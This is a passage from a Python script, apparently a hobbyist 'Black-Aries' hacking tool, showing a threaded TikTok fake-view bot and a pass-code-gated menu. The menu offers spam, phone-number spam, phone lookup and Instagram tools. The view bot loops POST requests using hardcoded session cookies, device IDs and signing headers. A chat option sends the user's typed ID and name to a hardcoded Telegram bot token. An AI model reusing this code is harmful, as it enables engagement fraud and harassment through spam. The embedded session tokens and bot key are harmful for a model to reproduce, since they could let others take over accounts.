                    'Cookie': 'passport_csrf_token=1f52305413453c9f064fdbb44c45ce8f; passport_csrf_token_default=1f52305413453c9f064fdbb44c45ce8f; d_ticket=c506701932849ea607835bc4ba2a6de8ec830; cmpl_token=AgQQAPO_F-RPsI4vzNb-op0_-tNAiDMdv4Q0YP89_g; multi_sids=6778236784885122054%3A0bcdc98424c32ae89cc3107afa55e054%7C6958702576372352001%3A19297903fa3cd1033c702c984a5960da%7C6961103230660166661%3A35637e321e7e4a81db24c69b17b4a60b; odin_tt=85b7f8bbfec7c8b0ed0702ded3901861b7a3f7672b30a8e981e05892a8ec91d063f79a8b66626ffa0ee77da8dd8ab78758407ebe1b9b153b79bd8e7801b8d154; sessionid=0bcdc98424c32ae89cc3107afa55e054; sessionid_ss=0bcdc98424c32ae89cc3107afa55e054; sid_guard=0bcdc98424c32ae89cc3107afa55e054%7C1622584971%7C5184000%7CSat%2C+31-Jul-2021+22%3A02%3A51+GMT; sid_tt=0bcdc98424c32ae89cc3107afa55e054; uid_tt=9da77c7397d3a1b2fcb09b2c308caf13bccd0e8f661fcfa42ae4b28e59eeb375; uid_tt_ss=9da77c7397d3a1b2fcb09b2c308caf13bccd0e8f661fcfa42ae4b28e59eeb375; store-country-code=sa; store-idc=alisg; install_id=6968950756058875649; ttreq=1$8931d94e61cc87fb7605bef76f9095961bf9ed9c',
                    'X-Khronos': '1622585867',
                    'X-Gorgon': '8402e0ae600039b3627aaa59cff051f5627a0c1b6c31a11ca101',
                    'x-common-params-v2': 'pass-region=1&pass-route=1&language=ar&version_code=17.4.0&app_name=musical_ly&vid=ECA76874-2CC7-47AB-8FF1-203212A0FA4C&app_version=17.4.0&carrier_region=SA&channel=App%20Store&mcc_mnc=42001&device_id=6967870973303490054&tz_offset=10800&account_region=&sys_region=SA&aid=1233&residence=SA&screen_width=1125&uoo=1&openudid=c8bc81b8a71df3dd85c09f6ef7c54f7f4d95fe5d&os_api=18&os_version=14.2&app_language=ar&tz_name=Asia/Riyadh&current_region=SA&device_platform=iphone&build_number=174014&device_type=iPhone10,6&iid=6968950756058875649&idfa=00000000-0000-0000-0000-000000000000&locale=ar&cdid=A834593D-2AB1-4D73-9C58-E29AC50FA194&content_language='
                }
                data = f'action_time=1622585868&aweme_type=0&first_install_time=1622333917&item_id={idpost}&play_delta=1&tab_type=4'
                while True:
                    req_view = requests.post(url, data=data, headers=headers).text
                    if ('"status_code":0') in req_view:
                        time.sleep(1)
                        print(f'[{Fore.LIGHTMAGENTA_EX}!{Fore.RESET}] done sent view.. \n')
                    else:
                        print(f'[{Fore.LIGHTMAGENTA_EX}!{Fore.RESET}] error send view..\n')

            threads = []
            for i in range(Thread):
                thread1 = threading.Thread(target=view)
                thread1.start()
                threads.append(thread1)
            for thread2 in threads:
                thread2.join()

        get_id_vedio()
print(Fore.LIGHTGREEN_EX + 'Hi bro am BlaCK Aries')
print(Fore.CYAN + '<<>>' * 20)
print(Fore.LIGHTGREEN_EX + 'you should be great account')
print(Fore.CYAN + '<<>>' * 20)
passtool=open('passtool.txt','r')
pinreed =passtool.read()
code = '23122006'
if pinreed == code:
    pass
    while True:
            os.system("clear")
            print(Fore.BLUE + '')
            os.system('figlet Black-Aries')
            print('[1] Phone Number ')
            print('[2] Data encryption')
            print('[3] spam')
            print('[4] Aries-List')
            print('[5] Spam Number Phone')
            print('[6] tool instagram')
            print('[7] TikTok Veiw')
            print('if you want send a messag for devolper "chat"')
            ask506 = input('>>>>')
            Arieslist()
            Phonenumber()
            spam()
            Data_encryption()
            spam_NumberPhone()
            insta_tool()
            TikTok_veiw()
            if 'chat' in ask506:
                os.system('clear')
                ID = input('Enter your Id :')
                Name = input('Enter you Name :')
                while True:
                    chat = input(">>>>")
                    requests.post(
                        f'''https://api.telegram.org/bot5324379511:AAErbZoYER5QVvgcszJaPy8t4ZVxnQbLFN4/sendMessage?chat_id=5141124832&text={ID}\n{Name} : {chat}''')
    else:
        print('Sorry i cannot pass you *_* ')
        print('https://github.com/blackaries506/blackariestool')
else:
    pin = input(Fore.LIGHTGREEN_EX + "Enter Pass code >>>")
##########################################################################################################################
    if pin == code:
        passtool = open('passtool.txt', 'w')
        passtool.write(pin)
        while True:
            os.system("python3 -m pip install -r requirements.txt")
            os.system("clear")
            print(Fore.BLUE + '')
            os.system('figlet Black-Aries')
            print('[1] Phone Number ')
            print('[2] Data encryption')
            print('[3] spam')
            print('[4] Aries-List')
            print('[5] Spam Number Phone')
            print('[6] tool instagram')
            print('[7] TikTok Veiw')
            ask506 = input('>>>>')
            Arieslist()
            Phonenumber()
            spam()
            Data_encryption()
            spam_NumberPhone()
            TikTok_veiw()
    else:
        print('Sorry i cannot pass you *_* ')
        print('https://github.com/blackaries506/blackariestool')
